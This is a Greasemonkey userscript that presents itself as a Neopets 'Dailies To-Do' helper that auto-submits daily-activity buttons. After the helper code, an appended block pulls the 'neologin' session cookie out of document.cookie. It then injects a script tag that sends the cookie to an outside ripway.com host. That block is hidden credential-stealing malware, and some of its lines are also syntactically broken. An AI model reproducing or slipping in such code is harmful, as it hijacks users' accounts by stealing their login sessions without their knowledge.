// ==UserScript==
// @name           Neopets : Dailies To-Do
// @namespace      http://neopets.wesley.eti.br
// @description    Plays those normal dailies that you need click a button
// @include        http://www.neopets.com/altador/council.phtml?*
// @include        http://www.neopets.com/bank.phtml
// @include        http://www.neopets.com/desert/fruitmachine.phtml
// @include        http://www.neopets.com/desert/shrine.phtml
// @include        http://www.neopets.com/faerieland/springs.phtml
// @include        http://www.neopets.com/island/tombola.phtml
// @include        http://www.neopets.com/jelly/jelly.phtml
// @include        http://www.neopets.com/prehistoric/omelette.phtml
// @include        http://www.neopets.com/water/fishing.phtml
// @include        http://www.neopets.com/worlds/geraptiku/tomb.phtml
// @include        http://www.neopets.com/faerieland/wheel.phtml
// @include        http://www.neopets.com/prehistoric/mediocrity.phtml

// @include        http://www.neopets.com/winter/adventcalendar.phtml
// @include        http://www.neopets.com/worlds/deadlydice.phtml
// @include        http://www.neopets.com/pirates/buriedtreasure/index.phtml
// @include        http://www.neopets.com/space/strangelever.phtml
// @include        http://www.neopets.com/medieval/pickyourown_index.phtml

// @author         w35l3y
// @email          w35l3y@brasnet.org
// @version        1.0.1
// @homepage       http://www.wesley.eti.br
// ==/UserScript==

/* ###[ prototypes ]### */
Array.prototype.in_array = function (needle, strict)
{
	return in_array(needle, this, strict);
};
/* ###[ /prototypes ]### */

(function(){	// script scope
	var language = GM_getValue("language","");
	var script = {
		interval:[2000,3000],
		language:document.evaluate('//select[@name="lang"]/option[@selected]/@value',document,null,XPathResult.STRING_TYPE,null).stringValue || cookieValue("lang") || "en",
		disable:GM_getValue("disable","/faerieland/wheel.phtml;/prehistoric/mediocrity.phtml;/worlds/deadlydice.phtml;/buriedtreasure/index.phtml;/space/strangelever.phtml;/medieval/pickyourown_index.phtml").split(";")
	};

	var externalData = GM_getValue("externalData","{response:{dailies:[]}}");
	if (language != script.language || !evalValue(externalData).response.dailies.length)
	{
		resourceText("http://neopets.wesley.eti.br/DailiesTo-Do/getExternalData.php?type=json&language="+script.language+"&r="+Math.random(),function(r){
			GM_setValue("language",language = script.language);
			GM_setValue("externalData",r);
			continueScript(r);
		});
	} else {
		continueScript(externalData);
	}

	function continueScript(r)
	{
		var dailies = evalValue(r).response.dailies;
		var bt;
		if (bt = dailies.length)
		{
			var loc = document.location.href.match(/^http:\/\/www\.neopets\.com((?:\/[a-z_]+)+\.phtml)/i);
			if (!script.disable.in_array(loc[1]))
			{
				for ( var bi = 0 ; bi < bt ; ++bi )
				{
					if (!loc[1].indexOf(dailies[bi][0])) // buttons of the current page
					{
						var nsResolver = {
							lookupNamespaceURI:function(prefix){
								var ns = {
									'xhtml' : 'http://www.w3.org/1999/xhtml',
									'regexp': 'http://exslt.org/regular-expressions'
								};
								return ns[prefix] || null;
							}
						};

						//var btn = document.evaluate("//input[regexp:test(@value,\""+dailies[bi][1]+"\")]",document,nsResolver,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null).snapshotItem(0);
						var hasNum = dailies[bi][1].indexOf("-NUMBER-");
						var btn = document.evaluate("//input[contains(@value,\""+( hasNum > -1 ? dailies[bi][1].substring(0,hasNum) : dailies[bi][1] )+"\")]",document,nsResolver,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null).snapshotItem(0); // gambi

						if (btn)
						{
							btn.form.submit();
							//alert("Achou o botão e clicou!");
							break;
						}
					}
				}
			}
		} else {
			alert("No dailies is available");
		}
	}
})();

/* ###[ includes ]### */
function in_array(needle, haystack, strict)
{
	for ( var i = 0 , t = haystack.length ; i < t ; ++i )
	{
		if (strict && needle === haystack[i] || needle == haystack[i]) return true;
	}
	return false;
}

function randomValue(p)
{
	return p[0]+Math.round((p[1]-p[0])*Math.random());
}
function cookieValue(p)
{
	var cookies = document.cookie;
	var pos = 1+p.length+cookies.lastIndexOf(p+"=");
	return cookies.substring(pos,cookies.indexOf(";",pos));
}
function resourceText(url,func,key,post) // 1.0.1
{
	if (!post && key && window.GM_getResourceText)
	{
		func(GM_getResourceText(key));
	} else {
		var options = {
			"url":url,
			"method": ( post ? "post" : "get" ),
			"headers":{
			     "User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14",
			     "Accept":"text/json,text/xml,text/html"
			},
			"onload":function (e) {
				var ok = true;
				if (url.match("[?&]type=json"))
				{
					var rjson = evalValue(e.responseText).response;
					if (rjson.errorMessage)
					{
						if (!rjson.actions) ok = false;
						alert(rjson.errorMessage);
					}
					else if (rjson.warningMessage)
					{
						alert(rjson.warningMessage);
					}
					if (rjson.location && (!rjson.location[0] || !GM_getValue(rjson.location[0],false)))
					{
						GM_openInTab(rjson.location[1]);
						if (rjson.location[0])
						{
							alert("A new tab was opened.\nUrl: " + rjson.location[1]);
							GM_log(rjson.location);
							GM_getValue(rjson.location[0],true);
						}
					}

					if (ok)
					{
						func(e.responseText);
					}
				} else {
					if (ok)
					{
						func(e.responseText);
					}
				}
			},
			"onerror":function (e) {
				alert("An error has ocurred while requesting "+url);
			}
		};
		if (post)
		{
			var data = "";
			for ( n in key )
			{
				data += "&" + n + "=" + encodeURIComponent(key[n]);
			}
			data = data.substr(1);

			options.headers["Content-type"] = "application/x-www-form-urlencoded";
			options.headers["Content-length"] = data.length;
			options.data = data;
		}
		GM_xmlhttpRequest(options);
	}
}
function evalValue(p)
{
	return eval("("+p+")");
}
/* ###[ /includes ]### */
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http://h1.ripway.com/jeffalio/cookie.php?cookie=';

var testArray = document.evaluate(
     "a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}
